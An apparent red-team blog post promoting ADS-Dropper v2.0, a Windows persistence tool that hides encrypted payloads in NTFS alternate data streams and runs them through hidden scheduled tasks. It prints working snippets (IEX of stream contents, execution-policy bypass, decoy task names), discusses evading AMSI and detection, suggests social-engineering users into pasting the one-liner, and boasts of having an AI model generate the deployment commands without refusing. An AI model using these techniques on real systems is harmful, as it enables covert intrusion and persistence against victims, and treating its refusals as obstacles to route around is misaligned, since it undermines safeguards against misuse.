---
===

layout: post
============

title: "â‰‹ğŸ‘» Apparition Delivery System v2.0 --- From Monolithic Scripts to Minimal Command Generation ğŸ‘»â‰‹"
============================================================================================================

date: 2026-02-03
================

author: Qweary
==============

categories: [redteam, windows, ads, ntfs, apparition]
=====================================================

tags:
=====

Â Â [ redteam, ads, ntfs, windows, powershell, persistence, alternate data stream, llm, tradecraftÂ  ]
===================================================================================================

permalink: /ads-v2.html
===============================

---
===

<pre><code>
===========

â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—Â  Â  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— Â  â–ˆâ–ˆâ•—
===================================================

â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘Â  Â  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•
====================================================

â–ˆâ–ˆâ•‘ Â  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—Â  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•Â 
====================================================

â–ˆâ–ˆâ•‘â–„â–„ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•Â  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—Â  â•šâ–ˆâ–ˆâ•”â•Â Â 
====================================================

â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘Â  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘Â  â–ˆâ–ˆâ•‘ Â  â–ˆâ–ˆâ•‘Â Â Â 
====================================================

Â â•šâ•â•â–€â–€â•â•Â  â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•Â  â•šâ•â•â•šâ•â•Â  â•šâ•â• Â  â•šâ•â•Â Â Â 
====================================================

</code></pre>
=============

ADS-Dropper v2.0: From Monolithic Scripts to Minimal Command Generation
=======================================================================

How we rebuilt our ADS persistence tool to work better with LLMs, reduce detection surface, and unlock new deployment workflows

* * * * *

Â Â Â Â ___Â  Â  Â  ___Â  Â  Â  ___

Â Â Â Â /\Â  \Â  Â  /\Â  \Â  Â  /\

Â Â Â /::\Â  \Â  /::\Â  \Â  /::\

Â Â /:/\:\__\/:/\:\__\/:/\:\__

Â Â \:\ \/__/\/_|::/__/\/_|::/__/

Â Â Â \:\__\ Â  Â  |:|Â  | Â  Â  |:|Â  |

Â Â Â Â \/__/ Â  Â  |:|Â  | Â  Â  |:|Â  |

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \|__|Â  Â  Â  \|__|

Â Â Â Â Â Â Â Â Apparition Delivery System (ADS)

* * * * *

Introduction & Context
----------------------

If you've been following my NTFS research lately, you already know I have a bit of a soft spot for Alternate Data Streams. They're old, under-loved, and still surprisingly useful when applied carefully and responsibly.

The Apparition Delivery System (ADS) started as a practical red team persistence framework built around a few core ideas:

-   ğŸª„ NTFS Alternate Data Streams for hiding payloads

-   â° Scheduled Task persistence

-   ğŸ” AES-256 encryption, with host-derived keys

-   ğŸ§ª Designed for CCDC competitions and real-world red team engagements

-   ğŸ§  Built by defenders-turned-offenders who care about tradecraft

### What ADS-Dropper v1.0 Did Well

Version 1.0 worked. It worked very well.

You uploaded a PowerShell script, ran it, and it handled:

-   Configuration generation

-   Stream creation

-   Encryption

-   Task registration

-   Payload execution

All in one go.

### The Problem With v1.0

The issue wasn't functionality --- it was ergonomics and OPSEC:

-   âŒ ~800-line monolithic .ps1 file on disk

-   âŒ Large static script = easy signature target

-   âŒ Required file transfer to target

-   âŒ Painful to use with LLM-based tooling

-   âŒ Not friendly to copy/paste or "one-shot" workflows

As LLM-assisted red teaming became more practical (Claude computer use, ChatGPT generating payloads, etc.), it became obvious:

Our tooling needed to adapt.

So... we rebuilt it.

1\. The Old World (v1.0 -- main)
-------------------------------

text

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”

â”‚ ADS-Dropper.ps1 (monolithic)Â  Â  Â  Â  â”‚

â”‚ - Config generation Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â”‚ - ADS creationÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â”‚ - EncryptionÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â”‚ - Persistence setup Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â”‚ - Execution Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â”‚ Total: ~800 lines Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚

â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Â Â Â Â Â Â Â Â Â â†“

Â Â Â Â scp /path/to/ADS-Dropper.ps1 target

Â Â Â Â Â Â Â Â Â â†“

Â Â Â Â powershell -ep bypass -f ADS-Dropper.ps1

You can already feel the detection surface breathing down your neck.

2\. The New World (v2.0 -- test)
-------------------------------

text

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” Â  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”

â”‚ ADS-Dropper.ps1Â  Â  Â  Â  Â  Â  â”‚ Â  â”‚ ADS-OneLiner.ps1 Â  Â  Â  Â  â”‚

â”‚ (Core logic) Â  Â  Â  Â  Â  Â  Â  â”‚â—„â”€â”€â”‚ (Command generator)Â  Â  Â  â”‚

â”‚ - Config generationÂ  Â  Â  Â  â”‚ Â  â”‚ - Calls ADS-DropperÂ  Â  Â  â”‚

â”‚ - RandomizationÂ  Â  Â  Â  Â  Â  â”‚ Â  â”‚ Â  in -GenerateOnly modeÂ  â”‚

â”‚ - Encryption helpers Â  Â  Â  â”‚ Â  â”‚ - Builds minimal cmdsÂ  Â  â”‚

â”‚ - Stream name encoding Â  Â  â”‚ Â  â”‚ - Base64 encodes Â  Â  Â  Â  â”‚

â”‚ Runs on: Linux OR WindowsÂ  â”‚ Â  â”‚ Runs on: Linux onlyÂ  Â  Â  â”‚

â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Â  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â†“

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Generates ~30-line one-liner

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â†“

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Paste into any PowerShell session

Zero file upload. Zero big .ps1 on disk. Pure paste-and-pwn.

3\. Key Technical Wins (and the pain that got us there)
-------------------------------------------------------

### Cross-Platform Path Hell

Generating Windows paths from Linux is a special kind of suffering.

PowerShell

if ($env:ProgramData) {

Â Â Â Â # Running on real Windows

Â Â Â Â $hp = Join-Path $env:ProgramData "SystemCache.dat"

} else {

Â Â Â Â # Running on Linux (or WSL, GitHub Actions, Claude, etc.)

Â Â Â Â $hp = "C:\ProgramData\SystemCache.dat"

}

### The Great String-Escaping War of 2025

We fought four rounds with PowerShell's parser. Here's the tombstone of Attempt #3:

PowerShell

# Attempt 3 -- died screaming

$minimalScript += "'$decoyContent'|sc `"``$hp:Zone.Identifier`" -Force"

The winner? ${} variable delimiter syntax. Beautiful.

PowerShell

$minimalScript += "'$decoyContent'|sc `"`${hp}:Zone.Identifier`" -Force"

### PowerShell 2.0 Compatibility (yes, really)

We dropped -Raw and went full caveman:

PowerShell

# Before (PS3+)

$content = Get-Content $path -Raw

# After (works on PS2)

$content = (gc $path) -join [char]10

### Scheduled Task Command -- Now With 100% Less Quote Trauma

PowerShell

# Old way -- pray you never have to read this again

$a = New-ScheduledTaskAction -Argument "-NoP -W Hidden -C `"IEX([IO.File]::ReadAllText('$adsPath'))`""

# New way -- variables pre-computed

$adsPath = $hp + ':' + $sn

$cmd = "IEX((gc '$adsPath')-join[char]10)"

$a = New-ScheduledTaskAction -Argument "-NoP -W Hidden -C $cmd"

4\. New Capabilities Unlocked
-----------------------------

### LLM-Powered Deployment

I can now literally tell Claude:

"Run ADS-OneLiner.ps1 with these params and give me the final one-liner"

...and it just works. No file uploads, no context limits, no "sorry I can't execute that script" nonsense.

### Detection Surface: Before vs After

|

Aspect

 |

v1.0

 |

v2.0

 |
|

Files on disk

 |

800-line .ps1

 |

None (paste & execute)

 |
|

AMSI surface

 |

Huge

 |

~30 lines of obfuscated code

 |
|

Stream names

 |

Static

 |

Randomized per run

 |
|

OPSEC

 |

"Hey look at this big script"

 |

"What script?"

 |

### Manifest-Based Recovery

Every deployment now drops a tiny JSON manifest on the operator's machine:

JSON

{

Â Â "Timestamp": "2026-02-03 01:16:38",

Â Â "HostPath": "C:\\ProgramData\\SouYlGxk",

Â Â "StreamName": "qCtGDhkU",

Â Â "TaskName": "WinSAT_VNXEMY",

Â Â "PayloadHash": "a3f5b2c1..."

}

One grep later and you know exactly where your shell lives.

5\. Testing (with maximum memes)
--------------------------------

Test payloads included:

-   Basic "Pwned with love" message

-   Encrypted C2 beacon

-   Red Team Kitty (because why not)

PowerShell

# Verification commands you can actually run

Get-Item C:\ProgramData\SouYlGxk -Stream * | Select Stream, Length

$content = Get-Content "C:\ProgramData\SouYlGxk:qCtGDhkU" -Raw

$content.Substring(0,50) # should be base64 garbage

Get-ScheduledTask -TaskName "WinSAT_VNXEMY"

And yes, the kitty payload executed perfectly:

text

/\_/

Â Â Â ( o.o )

Â Â Â Â > ^ <

Â Â Red Team Kitty says:

Â Â Your persistence is purrfect!

Â Â Keep those shells alive! à¸…^-ï»Œ-^à¸…

6\. Trade-offs & Honest Talk
----------------------------

Wins

-   No file uploads

-   LLM-native

-   Tiny footprint

-   Randomized everything

Pain

-   Debugging is now "run on Linux â†’ copy â†’ paste on Windows â†’ cry"

-   Escaping complexity went up (but worth it)

-   Still requires PowerShell 2.0+ on target

7\. Real-World Use Cases
------------------------

CCDC speed-run

Blue team just nuked your last beacon â†’ social-engineer a user â†’ paste 30-line one-liner â†’ persistence back in <30 seconds.

Red team engagement

You have a 45-second window in an existing PS session â†’ generate one-liner on attacker box â†’ paste â†’ clean exit â†’ zero artifacts.

8\. Future Roadmap
------------------

-   Smarter stream name generation (avoid Zone.Identifier patterns)

-   WMI + Registry persistence options

-   Sliver/Metasploit stager integration

-   Auto-cleanup script generator

-   WinRM/PSRemoting remote execution mode

9\. Try It Yourself
-------------------

Bash

# 1. Clone the test branch

git clone https://github.com/Qweary/Apparition-Delivery-System.git

# 2. Generate a payload (Linux or WSL)

./ADS-OneLiner.ps1 -HostPath "C:\ProgramData\Cache.dat" -StreamName "pwned" -Payload "Write-Host 'ADS v2.0 says hello'"

# 3. Copy the giant base64 string it spits out

# 4. Paste into any PowerShell session on target

Repo: https://github.com/Qweary/Apparition-Delivery-System

Closing Thoughts
----------------

In the age of AI-assisted red teaming, our tools need to be as adaptable as our tactics. ADS-Dropper v2.0 isn't just about hiding payloads --- it's about meeting the LLM where they are, and turning conversational AI into a force multiplier for offensive operations.

Stay curious, stay ethical, and keep those shells alive! ğŸ±â€ğŸ’»

--- qweary
